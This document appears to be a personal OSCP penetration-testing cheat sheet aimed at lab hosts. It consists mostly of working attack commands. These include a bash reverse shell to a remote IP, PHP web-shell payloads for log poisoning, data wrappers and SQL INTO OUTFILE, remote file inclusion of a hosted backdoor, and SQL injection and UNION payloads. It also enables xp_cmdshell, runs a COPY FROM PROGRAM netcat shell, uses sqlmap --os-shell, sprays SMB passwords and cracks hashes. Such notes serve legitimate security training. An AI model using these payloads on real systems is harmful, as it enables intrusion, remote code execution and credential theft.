# OSCP Notes

## Vital Tools

* wpscan https://github.com/wpscanteam/wpscan

## Reverse Shell 
```$ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"```

```$ nc -nvlp 4444```

## RDP
`sudo xfreerdp /u:"jason" /drive:/root /v:192.168.247.203`

# Web

## File Upload Vuln

Upload Web shells...

Overwrite files by calling the filename "../../../../../../root/.ssh/authorized_keys"

Then maybe try to log in?

## Local File Inclusion

* Attempt to read the access log ->
```curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log```

### Log poisoning

* Does the applicatoin write to the log? Maybe add a php web shell to your headers...
 ```User-Agnet Mozilla/5.0 <?php echo system($_GET['cmd']); ?>```

### PHP (and Data) Wrappers

Gives the ability to read files... even php files. 

```curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php```

Will yield this... which decoded is the php code

```
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
```

Or we can achieve command injection using a data wrapper:

```http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>```

### Remote File Inclusion

Reach out and touch your own hosted webshell

```curl "http://mountaindesserts.com/meteor/index.php?page=http://[my-ipaddress]/simple-backdoor.php&cmd=ls"```

## SQL Injection

### Connect and Nav

Login to MySQL using mysql: 

```$ mysql -u root -p'root' -h 192.168.50.16 -P 3306```

|MySQL Commands| 
|----| 
|  > select version();   |
|  > select system_user();   |
|  > show databases;   |

Login to MSSQL using impacket-mssqlclient: 

```$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth```

|MSSQL Commands| 
|----| 
|  > SELECT @@version;   |
|  > SELECT name FROM sys.databases;   |
|  > SELECT * FROM offsec.information_schema.tables;   |
| > select * from offsec.dbo.users; |


### GENERAL Attack Payloads:

```' or 1=1 in (select @@version) -- //```

```' OR 1=1 in (SELECT * FROM users) -- //```

```' or 1=1 in (SELECT password FROM users) -- //```

```' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //```


### UNION Attack Payloads:


```%' UNION SELECT database(), user(), @@version, null, null -- //```

```' UNION SELECT null, null, database(), user(), @@version  -- //```

```' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //```

```' UNION SELECT null, username, password, description, null FROM users -- //```


### Execute Commands

MSSQL Commands: 

```$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth```

```> EXECUTE sp_configure 'show advanced options', 1;```

```> RECONFIGURE;```

```> EXECUTE sp_configure 'xp_cmdshell',1;```

```> RECONFIGURE;```

```> EXECUTE xp_cmdshell 'whoami';```

### Write a Webshell Payloads:

```' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //```

### Command Execution with Stacked Queries:

```
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'nc -l -p -e /bin/sh';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```
### SQL Map 

Usage Commands:

* Note -p specifies a parameter we want to test
* Note --os-shell tries to get a shell on target

```sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump```

OR intercept a Post request and use that to pass parameters

```sqlmap -r POST.req -p item  --os-shell  --web-root "/var/www/html/tmp"```


# WordPress

## Plugins

Remember, WP Plugins are exploitable. Verisons can be found in the source code

### Get WP Plugins

```wpscan --url {url_here}```

### WP Plugin CVEs

`https://github.com/Hacker5preme/Exploits/blob/main/README.md`

# SMB

Password guess: `crackmapexec smb 192.168.247.227 -u nadine -p /home/kali/rockyou.txt`

# Password Cracking

KeePass to hash -> `keepass2john [name].kdbx > hashfile`

ssh2john to hash -> `ssh2john [name] > hashfile`

Best Rule for cracking: `https://github.com/Unic0rn28/hashcat-rules/blob/main/rules_full.7z`

Hashcat: `hashcat -a 0 -m 13400 pass.txt /home/kali/rockyou.txt -r /home/kali/Downloads/rules_full.rule`

